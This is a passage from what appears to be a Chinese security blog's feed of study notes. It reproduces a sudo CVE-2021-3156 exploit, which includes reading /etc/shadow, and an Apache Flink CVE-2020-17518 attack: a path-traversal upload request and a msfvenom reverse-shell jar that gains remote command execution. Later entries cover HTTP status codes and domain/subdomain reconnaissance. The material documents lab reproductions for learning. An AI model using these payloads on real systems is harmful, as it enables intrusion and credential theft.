su  test
cd /tmp
id
whoami
cat  /etc/shadow

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;本地开一个 pyweb，把 poc 用 wget 下载到这个容器里:&lt;/p&gt;&lt;p&gt;&lt;code&gt;python3 -m http.server 8000&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;wget http://192.168.11.1/CVE-2021-3156_nss_poc_ubuntu.tar.gz&lt;/code&gt;&lt;/p&gt;&lt;p&gt;然后解压 poc，切换到目录下 make 编译 poc:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz
cd CVE-2021-3156
make
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;接下来直接执行 POC，漏洞利用成功，到此为止&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/CVE-2021-3156/5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="2020-2021-CVE漏洞复现" scheme="http://avenue.cool/categories/2020-2021-CVE/" />
        <category term="2020-2021-CVE漏洞复现" scheme="http://avenue.cool/tags/2020-2021-CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <updated>2021-02-01T09:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/2020-2021-CVE/apache-Flink_CVE-2020-17518/</id>
        <title>Apache-Flink_CVE-2020-17518</title>
        <link rel="alternate" href="http://avenue.cool/2020-2021-CVE/apache-Flink_CVE-2020-17518/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;apache-flink文件上传&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache-flink文件上传&#34;&gt;#&lt;/a&gt; Apache Flink 文件上传&lt;/h1&gt;&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 【原理】&lt;/h2&gt;&lt;p&gt;Apache Flink 是由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎。Flink 以数据并行和流水线方式执行任意流数据程序，Flink 的流水线运行时系统可以执行批处理和流处理程序。此外，Flink 的运行时本身也支持迭代算法的执行。Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。&lt;/p&gt;&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 【工具】&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;浏览器&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#步骤&#34;&gt;#&lt;/a&gt; 【步骤】&lt;/h2&gt;&lt;p&gt;访问：http://your-ip:8081 进入 Apache Flink 控制面板：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;打开 BUrp 构造 POC，上传文件&lt;/p&gt;&lt;pre&gt;&lt;code&gt;
POST /jars/upload HTTP/1.1
Host: 192.168.243.189:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------13247690941547071692111317477
Content-Length: 250
Origin: http://192.168.243.189:8081
Connection: close
Referer: http://192.168.243.189:8081/

-----------------------------13247690941547071692111317477
Content-Disposition: form-data; name=&amp;quot;jarfile&amp;quot;; filename=&amp;quot;../../../../../../tmp/success&amp;quot;
Content-Type: text/plain


success
-----------------------------13247690941547071692111317477-

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;此时，我们利用之前的任意文件读取漏洞，读取我们上传的文件，查看是否上传成功。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://192.168.243.189:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fsuccess

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;我们还可以上传 jar 马实现反弹监听从而远程命令执行&lt;/p&gt;&lt;p&gt;首先我们使用 kali 的 MSF 生成 jar 马：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p java/shell_reverse_tcp lhost=192.168.243. lport=5555 -f jar &amp;gt;/home/kali/Desktop/shell.jar
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;然后本地机器新建命令行窗口，使用 nc 进行端口监听：&lt;/p&gt;&lt;p&gt;nc -lvvp 5555&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;最后把生成的 jar 马通过 Submit New Job 模块进行上传：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;点击 Submit 即可实现 jar 马反弹监听：&lt;/p&gt;&lt;p&gt;可以执行远程命令：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="2020-2021-CVE漏洞复现" scheme="http://avenue.cool/categories/2020-2021-CVE/" />
        <category term="2020-2021-CVE漏洞复现" scheme="http://avenue.cool/tags/2020-2021-CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <updated>2021-02-01T09:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</id>
        <title>4. WEB HTTP 状态码</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;常见的状态码含义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的状态码含义&#34;&gt;#&lt;/a&gt; 常见的状态码含义：&lt;/h2&gt;&lt;p&gt;100 继续 ： 服务器返回此代码已收到请求的第一部分，正在等待其他部分。&lt;br&gt;101 切换协议： 请求者要求服务器切换协议，服务器已确认并准备切换。&lt;br&gt;200 成功：表示客户端发来的请求在服务器端被正常处理了。&lt;br&gt;301 永久移动：请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。&lt;br&gt;302 临时移动：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求&lt;br&gt;400 Bad Request：表示请求报文中存在语法错误。&lt;br&gt;401 Unauthorized：表示发送的请求需要有通过 HTTP 认证的信息。&lt;br&gt;403 Forbidden：表明对请求资源的访问被服务器拒绝了。&lt;br&gt;404 Not Found：服务器无法找到请求的资源。&lt;br&gt;405 方法禁用：禁用请求中的方法。&lt;br&gt;408 请求超时： 服务器登后请求时发生超时。&lt;br&gt;500 Internal Server Error：表明服务器端在执行请求时发生了错误。&lt;br&gt;502 错误网关： 服务器作为网关或代理，从上游服务器收到无效响应。&lt;br&gt;503 Service Unavailable：表明服务器暂时处于超负载或进行停机维护&lt;br&gt;504 网关超时：服务器作为网关或代理，但是没有及时从上游服务器收到请求。&lt;br&gt;505 HTTP 版本不受支持：&lt;br&gt;服务器不支持请求中所用的 HTTP 协议版本。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:31:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/</id>
        <title>2. 收集域名信息</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;p&gt;知道目标域名之后，我们要做的第一件事情就是获取域名的注册信息，包括该域名的 DNS 服务器信息和注册人的联系信息等。&lt;/p&gt;&lt;h2 id=&#34;whois-查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#whois-查询&#34;&gt;#&lt;/a&gt; whois 查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;Whois 是一个标准的互联网协议，可以用于收集网络注册信息，注册的域名、IP地址等信息。在Whois查询中，得到注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所属人往往就是管理员。kali中已经默认安装了whois。whois + 域名
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2FsaS5vcmcvZG93bmxvYWRzLw==&#34;&gt;Kali 下 whois 查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dob2lzLmNoaW5hei5jb20v&#34;&gt;域名 Whois 查询 - 站长之家&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aG9pcy5haXpoYW4uY29tLw==&#34;&gt;Whois - 爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=&#34;&gt;IP-38&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2hvaXMubmV0Lw==&#34;&gt;Whois Lookup&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sb29rdXAuaWNhbm4ub3JnLw==&#34;&gt;ICANN Lookup&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aG9pcy5jbG91ZC50ZW5jZW50LmNvbS9kb21haW4/ZG9tYWluPQ==&#34;&gt;域名信息查询 - 腾讯云&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dob2lzLnhpbm5ldC5jb20v&#34;&gt;新网 whois 信息查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9pcHdob2lzLw==&#34;&gt;IP WHOIS 查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;备案信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#备案信息查询&#34;&gt;#&lt;/a&gt; 备案信息查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;网站备案是根据国家法律规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iZWlhbmJlaWFuLmNvbS8=&#34;&gt;ICP 备案查询网&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ljcC5jaGluYXouY29tLw==&#34;&gt;ICP 备案查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYWl6aGFuLmNvbS9zZW8v&#34;&gt;SEO 综合查询 - 爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ljcC5jaGluYXouY29tL3NlYXJjaHM=&#34;&gt;批量查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iZWlhbi5taWl0Lmdvdi5jbi8jL0ludGVncmF0ZWQvaW5kZXg=&#34;&gt;工业和信息化部 ICP/IP/ 域名信息备案管理&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;企业信用信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#企业信用信息查询&#34;&gt;#&lt;/a&gt; 企业信用信息查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;企业信用指一家第三方征信机构通过征集另一家企业信息，根据征信机构的信用评级规则，评价出的企业信用等级。
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nc3h0Lmdvdi5jbi9pbmRleC5odG1s&#34;&gt;国家企业信用信息公示系统&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb21wYW55LnhpemhpLmNvbS8=&#34;&gt;悉知 - 全国企业信息查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3JlZGl0Y2hpbmEuZ292LmNuLw==&#34;&gt;信用中国 - 个人信用查询搜索 - 企业信息查询搜索&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGlhbnlhbmNoYS5jb20v&#34;&gt;天眼查&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucWljaGFjaGEuY29tLw==&#34;&gt;企查查&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueGlhb2xhbmJlbi5jb20v&#34;&gt;小蓝本&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucWl4aW4uY29tLw==&#34;&gt;启信宝&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94aW4uYmFpZHUuY29tLw==&#34;&gt;百度企业信用&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;浏览器插件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#浏览器插件&#34;&gt;#&lt;/a&gt; 浏览器插件&lt;/h2&gt;&lt;p&gt;通过 Google、FireFox 等插件的使用，收集域名信息&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:31:20.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
        <title>3. 子域名信息收集</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;收集子域名信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#收集子域名信息&#34;&gt;#&lt;/a&gt; 收集子域名信息&lt;/h2&gt;&lt;p&gt;主域名是由两个或两个以上字母构成，中间由点号隔开，这个域名只有一个点号，子域名是顶级域名的下一级，域名整体包含两个 “.” 号。&lt;/p&gt;&lt;p&gt;子域名也就是二级域名，是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。那么问题来了，怎样才能尽可能多地搜集目标的高价值子域呢？常用的方法有以下这几种。&lt;/p&gt;&lt;h3 id=&#34;常见子域名的收集方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见子域名的收集方法&#34;&gt;#&lt;/a&gt; 常见子域名的收集方法：&lt;/h3&gt;&lt;p&gt;（1） Web 子域名猜测与实际访问尝试&lt;br&gt;（2） 搜索引擎查询主域名地址&lt;br&gt;（3）查询 DNS 解析记录&lt;br&gt;（4） 基于 DNS 查询的暴力破解&lt;br&gt;（5）手工分析（查看主站页面及相关页面）&lt;/p&gt;&lt;h3 id=&#34;在线平台查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在线平台查询&#34;&gt;#&lt;/a&gt; 在线平台查询&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=&#34;&gt;ip138&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9zdWJkb21haW4vP2RvbWFpbj0v&#34;&gt;站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oYWNrZXJ0YXJnZXQuY29tL2ZpbmQtZG5zLWhvc3QtcmVjb3Jkcy8=&#34;&gt;hackertarget&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudDFoMnVhLmNuL3Rvb2xzLw==&#34;&gt;t1h2ua&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v&#34;&gt;dnsdumpster&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kLmNoaW5hY3ljYy5jb20vaW5kZXgucGhwP209TG9naW4mYW1wO2E9aW5kZXg=&#34;&gt;chinacycc&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v&#34;&gt;dnsdumpster&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3ouemNqdW4uY29tLw==&#34;&gt;zcjun&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy55dW02LmNuL1Rvb2xzL3VybGJsYXN0Lw==&#34;&gt;tools.yum6.cn&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2xzLmJ1Z3NjYW5lci5jb20vc3ViZG9tYWluLw==&#34;&gt;tools.bugscaner&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;ip反查绑定域名网站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ip反查绑定域名网站&#34;&gt;#&lt;/a&gt; IP 反查绑定域名网站&lt;/h3&gt;&lt;p&gt;IP 关联域名，大部分网站一个 IP 多个域名&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3MudG9vbC5jaGluYXouY29tL3NhbWU/cw==&#34;&gt;站长之家&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8=&#34;&gt;爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=&#34;&gt;webscan&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy4xMTRiZXN0LmNvbS9pcC8=&#34;&gt;同 IP 网站查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZXZlcnNlaXAuZG9tYWludG9vbHMuY29tLw==&#34;&gt;反向 IP 查询&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;资产搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产搜索引擎&#34;&gt;#&lt;/a&gt; 资产搜索引擎&lt;/h3&gt;&lt;p&gt;google、shodan、FOFA、zoomeye&lt;/p&gt;&lt;h3 id=&#34;工具枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具枚举&#34;&gt;#&lt;/a&gt; 工具枚举&lt;/h3&gt;&lt;p&gt;常用子域名工具如下（Github 上都可搜到）&lt;/p&gt;&lt;ol&gt;&lt;li&gt;OneForAll&lt;br&gt;OneForAll 是一款功能强大的子域收集工具，拥有多个模块和接口扫描，收集子域信息很全，包括子域、子域 IP、子域常用端口、子域 Title、子域 Banner、子域状态等。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=&#34;&gt;项目地址&lt;/span&gt;&lt;br&gt;子域名收集： python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL29uZWZvcmFsbC5weQ==&#34;&gt;oneforall.py&lt;/span&gt; --target=&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3RhcmdldC5jb20=&#34;&gt;target.com&lt;/span&gt; run&lt;/p&gt;&lt;ol start=&#34;2&#34;&gt;&lt;li&gt;&lt;p&gt;Layer&lt;br&gt;Layer 子域名挖掘机的使用方法比较简单，在域名对话框中直接输入域名就可以进行扫描，它的显示界面比较细致，有域名、解析 IP、开放端口、Web 服务器和网站状态等&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;subDomainsBrute&lt;br&gt;subDomainsBrute 的特点是可以用小字典递归地发现三级域名、四级域名，甚至五级域名等不容易被探测到的域名。&lt;br&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==&#34;&gt;项目地址&lt;/span&gt;&lt;br&gt;子域名收集：python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N1YkRvbWFpbnNicnV0ZS5weQ==&#34;&gt;subDomainsbrute.py&lt;/span&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h0YXJnZXQuY29t&#34;&gt;xtarget.com&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 id=&#34;证书透明度公开日志枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书透明度公开日志枚举&#34;&gt;#&lt;/a&gt; 证书透明度公开日志枚举&lt;/h3&gt;&lt;p&gt;证书透明度 (Certificate Transparency, CT) 是证书授权机构 (CA) 的一个项目，证书授权机构会将每个 SSL/TLS 证书发布到公共日志中。一个 SSL/TLS 证书通常包含域名、子域名和邮件地址， 这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引 | 擎搜索一些公开的 CT 日志。&lt;/p&gt;&lt;p&gt;在线第三方平台查询&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jcnQuc2gv&#34;&gt;crt.sh&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jZW5zeXMuaW8v&#34;&gt;censys&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9teXNzbC5jb20v&#34;&gt;myssl&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;ns历史解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ns历史解析&#34;&gt;#&lt;/a&gt; NS 历史解析&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZG5zZGIuaW8v&#34;&gt;dnsdb&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92aWV3ZG5zLmluZm8v&#34;&gt;viewdns&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:31:20.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Linux/Linux/</id>
        <title>Linuxdf</title>
        <link rel="alternate" href="http://avenue.cool/Linux/Linux/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;p&gt;linux&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Linux运维" scheme="http://avenue.cool/categories/Linux%E8%BF%90%E7%BB%B4/" />
        <category term="Linux运维" scheme="http://avenue.cool/tags/Linux%E8%BF%90%E7%BB%B4/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/</id>
        <title>内网安全知识</title>
        <link rel="alternate" href="http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;p&gt;内网安全知识&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="内网安全知识" scheme="http://avenue.cool/categories/Intranet/" />
        <category term="内网安全知识" scheme="http://avenue.cool/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
        <title>1. 为什么要进行信息收集</title>
